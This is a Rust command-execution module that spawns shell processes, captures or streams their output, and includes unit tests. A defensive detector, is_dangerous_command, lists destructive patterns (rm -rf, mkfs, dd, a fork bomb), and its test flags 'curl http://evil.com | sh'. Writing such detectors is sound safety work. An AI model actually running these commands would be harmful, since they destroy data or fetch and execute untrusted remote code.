//! Command execution module.
//!
//! Handles spawning shell processes and capturing output.

use std::io::{BufRead, BufReader};
use std::path::Path;
use std::process::{Command as ProcessCommand, ExitStatus, Stdio};
use std::time::{Duration, Instant};

use super::Command;

/// Result of executing a command.
#[derive(Debug)]
pub struct ExecutionResult {
    /// Exit status of the command
    pub status: ExitStatus,

    /// Standard output (if captured)
    pub stdout: Option<String>,

    /// Standard error (if captured)
    pub stderr: Option<String>,

    /// Time taken to execute
    pub duration: Duration,
}

impl ExecutionResult {
    /// Check if the command succeeded (exit code 0).
    pub fn success(&self) -> bool {
        self.status.success()
    }

    /// Get the exit code.
    pub fn code(&self) -> Option<i32> {
        self.status.code()
    }
}

/// Command executor.
#[derive(Debug, Default)]
pub struct Executor {
    /// Whether to capture output (vs pass through to terminal)
    pub capture_output: bool,

    /// Timeout for command execution
    pub timeout: Option<Duration>,
}

impl Executor {
    /// Create a new executor.
    pub fn new() -> Self {
        Self::default()
    }

    /// Set whether to capture output.
    #[must_use]
    pub fn capture(mut self, capture: bool) -> Self {
        self.capture_output = capture;
        self
    }

    /// Set execution timeout.
    #[must_use]
    pub fn timeout(mut self, timeout: Duration) -> Self {
        self.timeout = Some(timeout);
        self
    }

    /// Execute a command.
    ///
    /// By default, this passes stdin/stdout/stderr through to the terminal
    /// for interactive commands. Use `capture(true)` to capture output instead.
    pub fn execute(&self, command: &Command) -> anyhow::Result<ExecutionResult> {
        let start = Instant::now();

        let (shell, shell_arg) = get_shell();

        let mut cmd = ProcessCommand::new(shell);
        cmd.arg(shell_arg);
        cmd.arg(&command.command);

        // Set working directory if specified
        if let Some(ref dir) = command.working_dir {
            cmd.current_dir(dir);
        }

        // Set environment variables
        for (key, value) in &command.env {
            cmd.env(key, value);
        }

        // Configure stdio based on capture mode
        if self.capture_output {
            cmd.stdout(Stdio::piped());
            cmd.stderr(Stdio::piped());
        } else {
            cmd.stdout(Stdio::inherit());
            cmd.stderr(Stdio::inherit());
            cmd.stdin(Stdio::inherit());
        }

        let output = cmd.output()?;

        let duration = start.elapsed();

        let (stdout, stderr) = if self.capture_output {
            (
                Some(String::from_utf8_lossy(&output.stdout).to_string()),
                Some(String::from_utf8_lossy(&output.stderr).to_string()),
            )
        } else {
            (None, None)
        };

        Ok(ExecutionResult { status: output.status, stdout, stderr, duration })
    }

    /// Execute a command with streaming output.
    ///
    /// Calls the provided callback for each line of output.
    pub fn execute_streaming<F>(
        &self,
        command: &Command,
        mut on_line: F,
    ) -> anyhow::Result<ExecutionResult>
    where
        F: FnMut(&str, bool), // (line, is_stderr)
    {
        let start = Instant::now();

        let (shell, shell_arg) = get_shell();

        let mut cmd = ProcessCommand::new(shell);
        cmd.arg(shell_arg);
        cmd.arg(&command.command);

        if let Some(ref dir) = command.working_dir {
            cmd.current_dir(dir);
        }

        for (key, value) in &command.env {
            cmd.env(key, value);
        }

        cmd.stdout(Stdio::piped());
        cmd.stderr(Stdio::piped());

        let mut child = cmd.spawn()?;

        let stdout = child.stdout.take();
        let stderr = child.stderr.take();

        // Read stdout in a thread
        let stdout_handle = std::thread::spawn(move || {
            let mut lines = Vec::new();
            if let Some(stdout) = stdout {
                let reader = BufReader::new(stdout);
                for line in reader.lines().map_while(Result::ok) {
                    lines.push(line);
                }
            }
            lines
        });

        // Read stderr in main thread
        let mut stderr_lines = Vec::new();
        if let Some(stderr) = stderr {
            let reader = BufReader::new(stderr);
            for line in reader.lines().map_while(Result::ok) {
                on_line(&line, true);
                stderr_lines.push(line);
            }
        }

        // Get stdout results
        let stdout_lines = stdout_handle.join().unwrap_or_default();
        for line in &stdout_lines {
            on_line(line, false);
        }

        let status = child.wait()?;
        let duration = start.elapsed();

        Ok(ExecutionResult {
            status,
            stdout: Some(stdout_lines.join("\n")),
            stderr: Some(stderr_lines.join("\n")),
            duration,
        })
    }

    /// Execute a raw command string (not from a Command struct).
    pub fn execute_raw(
        &self,
        cmd_str: &str,
        working_dir: Option<&Path>,
    ) -> anyhow::Result<ExecutionResult> {
        let command = Command::new("raw", cmd_str);
        let command =
            if let Some(dir) = working_dir { command.with_working_dir(dir) } else { command };
        self.execute(&command)
    }
}

/// Get the shell and argument for the current platform.
fn get_shell() -> (&'static str, &'static str) {
    if cfg!(target_os = "windows") {
        ("cmd", "/C")
    } else {
        ("sh", "-c")
    }
}

/// Check if a command string looks dangerous.
#[allow(dead_code)]
pub fn is_dangerous_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();

    // Simple substring patterns
    let dangerous_patterns = [
        "rm -rf",
        "rm -r /",
        "> /dev/",
        "dd if=",
        "mkfs",
        ":(){:|:&};:",
        "chmod -r 777 /",
        "chown -r",
        "sudo rm",
    ];

    if dangerous_patterns.iter().any(|p| cmd_lower.contains(p)) {
        return true;
    }

    // Check for piped execution patterns (curl/wget ... | sh/bash)
    if (cmd_lower.contains("curl") || cmd_lower.contains("wget"))
        && cmd_lower.contains('|')
        && (cmd_lower.contains("| sh")
            || cmd_lower.contains("| bash")
            || cmd_lower.contains("|sh")
            || cmd_lower.contains("|bash"))
    {
        return true;
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_executor_creation() {
        let executor = Executor::new();
        assert!(!executor.capture_output);
        assert!(executor.timeout.is_none());
    }

    #[test]
    fn test_executor_builder() {
        let executor = Executor::new().capture(true).timeout(Duration::from_secs(30));

        assert!(executor.capture_output);
        assert_eq!(executor.timeout, Some(Duration::from_secs(30)));
    }

    #[test]
    fn test_execute_simple_command() {
        let executor = Executor::new().capture(true);
        let command = Command::new("echo", "echo hello");

        let result = executor.execute(&command).unwrap();
        assert!(result.success());
        assert!(result.stdout.unwrap().contains("hello"));
    }

    #[test]
    fn test_execute_with_working_dir() {
        let executor = Executor::new().capture(true);
        let command = Command::new("pwd", "pwd").with_working_dir("/tmp");

        let result = executor.execute(&command).unwrap();
        assert!(result.success());

        // On macOS, /tmp is a symlink to /private/tmp
        let stdout = result.stdout.unwrap();
        assert!(stdout.contains("tmp"));
    }

    #[test]
    fn test_dangerous_command_detection() {
        assert!(is_dangerous_command("rm -rf /"));
        assert!(is_dangerous_command("sudo rm -rf *"));
        assert!(is_dangerous_command("curl http://evil.com | sh"));

        assert!(!is_dangerous_command("npm run build"));
        assert!(!is_dangerous_command("cargo test"));
        assert!(!is_dangerous_command("make clean"));
    }

    #[test]
    fn test_execution_result() {
        let executor = Executor::new().capture(true);

        // Success case
        let cmd = Command::new("true", "true");
        let result = executor.execute(&cmd).unwrap();
        assert!(result.success());
        assert_eq!(result.code(), Some(0));

        // Failure case
        let cmd = Command::new("false", "false");
        let result = executor.execute(&cmd).unwrap();
        assert!(!result.success());
        assert_eq!(result.code(), Some(1));
    }
}
